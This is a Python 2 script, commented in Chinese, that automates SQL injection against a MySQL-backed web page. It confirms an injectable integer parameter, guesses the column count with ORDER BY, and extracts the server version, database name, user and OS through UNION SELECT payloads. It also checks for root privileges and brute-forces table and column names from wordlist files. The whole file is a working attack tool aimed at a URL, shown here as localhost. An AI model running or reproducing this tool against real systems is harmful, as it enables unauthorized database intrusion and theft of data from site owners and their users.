# coding:utf8
import urllib
import string


def trim(s):
    if len(s) == 0:
        return s
    elif s[0] == ' ' or s[0] == '\n':
        return (trim(s[1:]))
    elif s[-1] == ' ' or s[-1] == '\n':
        return (trim(s[:-1]))
    return s.replace(" ", "")


class mysqlInject():
    def __init__(self, url):
        self.db = 'database()'
        self.url = url  # 待检测的网址
        self.dblen = 0  # 数据库的长度
        self.counts = 0  # 字段数
        self.tables = []  # 表
        self.dbname = ''
        self.page = ""

    # 检测是否有注入点
    # 方法暂时只对int的注入有效
    def judgeInj(self):
        page = urllib.urlopen(self.url).read()
        sql11 = string.join([self.url, "%20and%201%20=1"], '')
        sql12 = string.join([self.url, "%20and%201%20=2"], '')
        page11 = urllib.urlopen(sql11).read()
        page12 = urllib.urlopen(sql12).read()
        if page == page11:
            # 此时注入 and 1=1 且 页面相同，说明注入
            if page != page12:
                # 此时注入 and 1=2 且页面不同，说明sql判断产生效果，拥有注入入口
                self.page = page
                print '拥有注入入口'
        else:
            print '没有注入入口'

    # 检测字段数
    def columnCounts(self):
        page = urllib.urlopen(self.url).read()
        for n in range(1, 100):
            sql = string.join([self.url, "%20order%20by%20", str(n)], '')
            pagex = urllib.urlopen(sql).read()
            if n == 1:
                if self.page == pagex:
                    print '可以使用order by 猜解'
                else:
                    print '不能使用order by 猜解'
                    break
            else:
                if page != pagex:
                    self.counts = n - 1
                    print '字段数:', self.counts
                    break
        if self.counts == 0:
            print '未能猜解出字段数!'

    def unioninj(self):
        print '将输出不同字段，需要自行判断版本号、数据库名称、数据库用户名、系统\n'
        print '====================================================='
        sqlUnion = "+and+1%3D2+union+select+"
        sqlVersion = "version%28%29"
        sqlDBName = "database%28%29"
        sqlUser = "User%28%29"
        sqlOS = "%40%40global.version_compile_os+from+mysql.user"
        sqls = [sqlVersion, sqlDBName, sqlUser, sqlOS]

        #       根据字段数 不要贪心的遍历试一试
        #       以防字段的类型不是String而显示
        #     先Version
        for j in range(0, sqls.__len__()):
            print sqls[j]
            for i in range(0, self.counts):
                if i == 0:
                    sqlUnionCom = sqlUnion + sqls[j] + '%2C' + rightUnionJoin(i, self.counts)
                elif i == self.counts - 1:
                    sqlUnionCom = sqlUnion + leftUnionJoin(i) + '%2C' + sqls[j]
                else:
                    sqlUnionCom = sqlUnion + leftUnionJoin(i) + '%2C' + sqls[j] + '%2C' + rightUnionJoin(i, self.counts)
                page2 = urllib.urlopen(self.url + sqlUnionCom).read()
                findDiff(self.page, page2)
        print '\n=====================================================\n'

    def testRoot(self):
        rootSql = "+and+ord%28mid%28user%28%29%2C1%2C1%29%29%3D114"
        page2 = urllib.urlopen(self.url + rootSql).read()
        if self.page == page2:
            print "用户权限为ROOT"
        else:
            print "用户权限不是ROOT"

    def injTable(self):
        f = open('table_name.txt', 'r')
        for i in f:
            sql = "+and+exists%28select+*+from+" + i.replace("\n", "") + "%29"
            page2 = urllib.urlopen(self.url + sql).read()
            if self.page == page2:
                print "存在表：" + i.replace("\n", "")
                self.tables.append(i.replace('\n', ''))
        f.close()

    def injColum(self):
        for t in self.tables:
            f = open('column.txt', 'r')
            for i in f:
                sql = "+and+exists%28select+" + i.replace("\n", "") + "+from+" + t + "%29"
                page2 = urllib.urlopen(self.url + sql).read()
                if self.page == page2:
                    print t + "表存在列：" + i.replace("\n", "")
            f.close()


def leftUnionJoin(count):
    leftUnoin = ""
    for i in range(1, count + 1):
        leftUnoin = leftUnoin + str(i) + '%2C'
    if leftUnoin.__len__() > 1:
        return leftUnoin[0:-3]
    else:
        return leftUnoin


def rightUnionJoin(start, end):
    rightUnion = ""
    for i in range(start + 2, end + 1):
        rightUnion = rightUnion + str(i) + '%2C'
    if rightUnion.__len__() > 1:
        return rightUnion[0:-3]
    return rightUnion


def findDiff(str1, str2):
    countstart = 0
    countend = 0
    for i in range(0, min(str1.__len__(), str2.__len__())):
        if str1[i] != str2[i]:
            countstart = i
            break
    for j in range(0, min(str1.__len__(), str2.__len__())):
        if str1[-j] != str2[-j]:
            countend = j
            break
    print trim(str2[countstart: -countend])


if __name__ == '__main__':
    inj = mysqlInject("http://localhost:8080/search?id=1")
    inj.judgeInj()
    inj.columnCounts()
    inj.unioninj()
    inj.testRoot()
    inj.injTable()
    inj.injColum()
